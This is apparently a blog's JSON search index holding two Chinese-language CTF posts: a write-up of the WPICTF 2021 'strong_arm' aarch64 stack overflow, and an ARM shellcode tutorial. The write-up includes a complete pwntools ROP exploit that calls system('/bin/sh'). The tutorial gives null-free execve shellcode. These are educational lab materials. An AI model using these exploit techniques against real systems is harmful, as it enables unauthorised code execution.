[{"categories":["pwn"],"content":"文件来源: [strong_arm](ctf-write-ups/wpictf2021/strong_arm at master · datajerk/ctf-write-ups (github.com)) ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:0:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"环境搭建 安装 qemu-user，libc 和 binutils： $ sudo apt install qemu-user libc6-arm64-cross binutils-aarch64-linux-gnu\r 发现交叉编译工具链里没有 ldd，可以用 readelf 替代： $ aarch64-linux-gnu-readelf -a arm | grep 'library'\r0x0000000000000001 (NEEDED) Shared library: [libc.so.6]\r 查找 gadget： $ ropper --nocolor --file /usr/aarch64-linux-gnu/lib/libc.so.6 \u003e gadget\r$ cat gadget | grep ': ldr x0.*; ldp x29, x30, \\[sp\\], #0x[0-9a-f]*; ret; $'\r ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:1:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"漏洞分析 非常明显的栈溢出漏洞。但需要注意的是 Aarch64 的函数调用栈栈帧结构与 x86 不同。以该题 main 栈帧为例，x29 和 x30 分别是栈基址寄存器和 lr 。可以看到这两个寄存器的值保存在栈顶，然后才是局部变量。栈帧结构与 x86 正好是相反的。因此发生栈溢出的时候能够修改的是 caller 的返回地址。 .text:00000000004006B0 STP X29, X30, [SP,#var_20]!\r.text:00000000004006B4 MOV X29, SP\r.text:00000000004006B8 STR W0, [X29,#0x20+var_4]\r.text:00000000004006BC STR X1, [X29,#0x20+var_10]\r.text:00000000004006C0 ADRP X0, #printf_ptr@PAGE\r.text:00000000004006C4 LDR X1, [X0,#printf_ptr@PAGEOFF]\r.text:00000000004006C8 ADRL X0, aPrintAtP ; \"print at %p\\n\"\r.text:00000000004006D0 BL .printf\r.text:00000000004006D4 BL vulnerable\r.text:00000000004006D8 MOV W0, #0\r.text:00000000004006DC LDP X29, X30, [SP+0x20+var_20],#0x20\r.text:00000000004006E0 RET\r 由于 ret 指令不从栈上取返回地址，而是从 x30 取，因此 rop chain 的构造比 x86 要困难一些。 # ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;\r gadget = 0x0000000000063e1c\rpayload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh')))\r 这里使用的 libc 是 2.31 版本，不过构造方法应该都是一致的。首先填充 vuln 函数的局部变量空间以及 x29 然后是我们的 gadget，然后填充 main 的局部变量空间。在 main 退出时 sp 指向 payload 中偏移为 0xa0 的位置，因此根据我们的 gadget 需要在 0xb8 的位置填上 /bin/sh 地址，再在栈顶填好 x29 和 x30，就可以调用 system(\"/bin/sh\") 了。 完整 exp 如下： from pwn import *\rcontext.log_level = 'debug'\rbinary = ELF('./arm')\rlibc = ELF('/usr/aarch64-linux-gnu/lib/libc.so.6')\rcmd = 'qemu-aarch64 -L /usr/aarch64-linux-gnu arm'\rp = process(cmd.split(' '))\r# ldr x0, [sp, #0x18]; ldp x29, x30, [sp], #0x20; ret;\r gadget = 0x0000000000063e1c\rp.recvuntil('print at ')\rleak = int(p.recvline()[:-1], 16)\rlibc.address = leak - libc.sym.printf\rsuccess(hex(libc.address))\rpayload = b'a' * 0x88 + p64(gadget + libc.address) + b'a' * 0x18 + p64(libc.sym.system) + b'a' * 0x8 + p64(next(libc.search(b'/bin/sh')))\rp.sendline(payload)\rp.interactive()\r ","date":"2021-07-28","objectID":"/wpictf-2021-strong_arm/:2:0","tags":["aarch64","pwn","rop"],"title":"Wpictf 2021 Strong_arm","uri":"/wpictf-2021-strong_arm/"},{"categories":["pwn"],"content":"之前一直对 Arm pwn 不了解，但 CTF 中 Arm pwn 出现频率还是挺高的。Defcon qual 2021 也有一道比较简单的 Arm pwn。编写 Shellcode 是漏洞利用的基础，因此从它开始入门 Arm pwn。主要参考 wrting arm shellcode, 系统环境是 azeria lab vm 2.0。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:0:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"系统调用 一般情况下执行 shellcode 的目的是弹出一个shell，即 execve(\"/bin/sh\", 0, 0)。32 bit arm 系统调用号通过 r7传递，参数依次保存在 r0 - r6。汇编代码如下： .section .text\r.global _start\r_start:\radd r0, pc, #12\rmov r1, #0\rmov r2, #0\rmov r7, #11\rsvc #0\r.ascii \"/bin/sh\\0\"\r ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:1:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"去除 Null Byte 上面的汇编代码经过汇编后得到的机器指令中含有非常多的 null byte，这对 shellcode 来说是非常致命的。因为漏洞函数往往会被 null byte 截断。 $ objdump -d execv\rexecv: file format elf32-littlearm\rDisassembly of section .text:\r00010054 \u003c_start\u003e:\r10054: e28f000c add r0, pc, #12\r10058: e3a01000 mov r1, #0\r1005c: e3a02000 mov r2, #0\r10060: e3a0700b mov r7, #11\r10064: ef000000 svc 0x00000000\r10068: 6e69622f .word 0x6e69622f\r1006c: 0068732f .word 0x0068732f\r 需要注意的是在 x86 架构下 pc 的值是下一条指令的地址，而在 arm 架构中 pc 的值是下下条指令的地址。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"指令部分 对于指令中的 null byte 可以通过使用 Thumb mode 来去除。 .section .text\r.global _start\r_start:\r.code 32\radd r3, pc, #1\rbx r3\r.code 16\radd r0, pc, #8\reor r1, r1, r1\reor r2, r2, r2\rmov r7, #11\rsvc #1\rmov r5, r5\r.ascii \"/bin/sh\\0\"\r 其中 mov r5, r5 用于对齐。 ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:1","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"字符串部分 上面的汇编代码得到的机器码是不含 null byte 的，但作为参数的字符串末尾却必须包含一个 null byte。解决方法是先在目标位置存放一个任意非 0 的值，然后在运行时将它置 0。 .section .text\r.global _start\r_start:\r.code 32\radd r3, pc, #1\rbx r3\r.code 16\radd r0, pc, #8\reor r1, r1, r1\reor r2, r2, r2\rstrb r2, [r0, #7]\rmov r7, #11\rsvc #1\r.ascii \"/bin/shx\"\r ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:2:2","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"},{"categories":["pwn"],"content":"测试 Shellcode 链接时默认 .text 段不可写，而 /bin/sh 在 .text 段中。使用 -N 使其可写。 ld --help | grep 'readonly'\r-N, --omagic Do not page align data, do not make text readonly\r--no-omagic Page align data, make text readonly\r ","date":"2021-07-26","objectID":"/arm-pwn-shellcode/:3:0","tags":["arm","shellcode","pwn"],"title":"Arm Pwn Shellcode","uri":"/arm-pwn-shellcode/"}]